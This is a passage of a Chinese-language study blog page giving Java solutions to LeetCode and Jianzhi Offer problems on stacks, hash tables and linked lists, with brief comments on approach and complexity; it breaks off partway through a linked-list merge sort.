<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h3 id="20-有效的括号-x2F-x2F"><a href="#20-有效的括号-x2F-x2F" class="headerlink" title="20. 有效的括号&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/valid-parentheses/">20. 有效的括号</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        Stack&lt;Character&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stack.isEmpty() || sc[i] != stack.pop()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-31-栈的压入、弹出序列"><a href="#剑指-Offer-31-栈的压入、弹出序列" class="headerlink" title="剑指 Offer 31. 栈的压入、弹出序列"></a><a href="https://leetcode-cn.com/problems/zhan-de-ya-ru-dan-chu-xu-lie-lcof/">剑指 Offer 31. 栈的压入、弹出序列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断合不合法，用个栈试一试: </span></span><br><span class="line"><span class="comment">// 把压栈的元素按顺序压入，当栈顶元素和出栈的第一个元素相同，则将该元素弹出，出栈列表指针后移并继续判断。</span></span><br><span class="line"><span class="comment">// 最后判断出栈列表指针是否指向出栈列表的末尾即可。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">validateStackSequences</span><span class="params">(<span class="type">int</span>[] pushed, <span class="type">int</span>[] popped)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> e :</span><br><span class="line">                pushed) &#123;</span><br><span class="line">            stack.push(e);</span><br><span class="line">            <span class="keyword">while</span> (j &lt; popped.length &amp;&amp; !stack.isEmpty() &amp;&amp; popped[j] == stack.peek()) &#123;</span><br><span class="line">                stack.pop();</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="155-最小栈"><a href="#155-最小栈" class="headerlink" title=" 155. 最小栈"></a><a href="https://leetcode-cn.com/problems/min-stack"> 155. 最小栈</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; s1;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; s2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MinStack</span><span class="params">()</span> &#123;</span><br><span class="line">        s1 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        s2 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        s1.push(val);</span><br><span class="line">        <span class="keyword">if</span> (!s2.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s2.peek() &gt;= val) &#123;</span><br><span class="line">                s2.push(val);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s2.push(val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pop</span> <span class="operator">=</span> s1.pop();</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> s2.peek();</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (min == pop) &#123;</span><br><span class="line">            s2.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s1.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s2.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><h3 id="1-两数之和-x2F-x2F"><a href="#1-两数之和-x2F-x2F" class="headerlink" title="1. 两数之和&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/two-sum/">1. 两数之和</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;i, map.get(target - nums[i])&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="36-有效的数独-x2F-x2F"><a href="#36-有效的数独-x2F-x2F" class="headerlink" title="36. 有效的数独&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/valid-sudoku/">36. 有效的数独</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用空间换时间, 3个9*9boolean矩阵,先验证行,再验证列,再验证块,出现的标记为true;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidSudoku</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span>[][] row = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="type">boolean</span>[][] col = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="type">boolean</span>[][] block = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">9</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> board[i][j] - <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">blockIndex</span> <span class="operator">=</span> (i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">if</span> (row[i][t] || col[j][t] || block[blockIndex][t]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                row[i][t] = <span class="literal">true</span>;</span><br><span class="line">                col[j][t] = <span class="literal">true</span>;</span><br><span class="line">                block[blockIndex][t] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-50-第一个只出现一次的字符"><a href="#剑指-Offer-50-第一个只出现一次的字符" class="headerlink" title="剑指 Offer 50. 第一个只出现一次的字符"></a><a href="https://leetcode-cn.com/problems/di-yi-ge-zhi-chu-xian-yi-ci-de-zi-fu-lcof/">剑指 Offer 50. 第一个只出现一次的字符</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字典(99%)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">firstUniqChar</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : sc</span><br><span class="line">                ) &#123;</span><br><span class="line">            temp[c - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                sc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp[c - <span class="string">&#x27;a&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 哈希表68%</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">firstUniqChar</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        HashMap&lt;Character, Boolean&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                sc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(c)) &#123;</span><br><span class="line">                map.put(c, <span class="literal">false</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.put(c, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                sc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(c)) &#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="41-缺失的第一个正数"><a href="#41-缺失的第一个正数" class="headerlink" title="41. 缺失的第一个正数"></a><a href="https://leetcode-cn.com/problems/first-missing-positive">41. 缺失的第一个正数</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hashset</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">firstMissingPositive</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        HashSet&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            set.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!set.contains(i)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原地哈希</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">firstMissingPositive</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(nums[i] &gt;= <span class="number">1</span> &amp;&amp; nums[i] != i+<span class="number">1</span> &amp;&amp; nums[i] - <span class="number">1</span> &lt; len &amp;&amp; nums[i] != nums[nums[i] - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[nums[i]-<span class="number">1</span>];</span><br><span class="line">                nums[nums[i]-<span class="number">1</span>] = nums[i];</span><br><span class="line">                nums[i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] != i+<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> len+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原地哈希(优先使用这个)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">firstMissingPositive</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= <span class="number">0</span> || nums[i] &gt; n) &#123;</span><br><span class="line">                nums[i] = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == -<span class="number">1</span> || nums[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nums[(nums[i] - <span class="number">1</span>) % n] == -<span class="number">1</span>) &#123;</span><br><span class="line">                nums[(nums[i] - <span class="number">1</span>) % n] = nums[i]+ n;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nums[(nums[i] - <span class="number">1</span>) % n] += n;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nums[i] &lt;= n &amp;&amp; nums[i] &gt;= <span class="number">1</span> )|| nums[i] == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> n + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="206-反转链表-x2F"><a href="#206-反转链表-x2F" class="headerlink" title="206. 反转链表&#x2F;"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/">206. 反转链表</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 头插法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> p .next;</span><br><span class="line">            p.next = dummy.next;</span><br><span class="line">            dummy.next = p;</span><br><span class="line">            p = q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">    head.next.next = head;</span><br><span class="line">    head.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-两数相加-x2F-x2F"><a href="#2-两数相加-x2F-x2F" class="headerlink" title="2. 两数相加&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/add-two-numbers/">2. 两数相加</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (l1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="literal">null</span> || l2 != <span class="literal">null</span> || carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> l1 == <span class="literal">null</span> ? <span class="number">0</span> : l1.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> l2 == <span class="literal">null</span> ? <span class="number">0</span> : l2.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> a + b + carry;</span><br><span class="line">            carry = sum / <span class="number">10</span>;</span><br><span class="line">            tail.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            <span class="keyword">if</span> (l1 != <span class="literal">null</span>) &#123;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tail.next = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="21-合并两个有序链表-x2F-x2F-x2F"><a href="#21-合并两个有序链表-x2F-x2F-x2F" class="headerlink" title="21. 合并两个有序链表&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">21. 合并两个有序链表</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归 O(m+n) O(m+n)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (l1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (l1.val &lt;= l2.val) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> mergeTwoLists(l1.next, l2);</span><br><span class="line">            l1.next = node;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> mergeTwoLists(l1, l2.next);</span><br><span class="line">            l2.next = node;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  迭代</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="comment">// 用尾插法</span></span><br><span class="line">        <span class="comment">// 定义一个前置节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="literal">null</span> &amp;&amp; l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果来l1的val小于等于l2的val</span></span><br><span class="line">            <span class="keyword">if</span> (l1.val &lt;= l2.val) &#123;</span><br><span class="line">                tail.next = l1;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tail.next = l2;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 最后l1不为空最后直接接在tail</span></span><br><span class="line">        <span class="comment">// 这个就是这个</span></span><br><span class="line">        <span class="keyword">if</span> (l1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="148-排序链表-x2F"><a href="#148-排序链表-x2F" class="headerlink" title="148. 排序链表&#x2F;"></a><a href="https://leetcode-cn.com/problems/sort-list/">148. 排序链表</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 归并排序(递归法)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">sortList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> slow.next;</span><br><span class="line">        slow.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">rear</span> <span class="operator">=</span> prev;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">left</span> <span class="operator">=</span> sortList(head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">right</span> <span class="operator">=</span> sortList(temp);</span><br><span class="line">        <span class="keyword">while</span> (left != <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (left.val &lt;= right.val) &#123;</span><br><span class="line">                rear.next = left;</span><br><span class="line">                left = left.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                rear.next = right;</span><br><span class="line">                right = right.next;</span><br><span class="line">            &#125;</span><br><span class="line">            rear = rear.next;</span><br><span class="line">            rear.next = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span 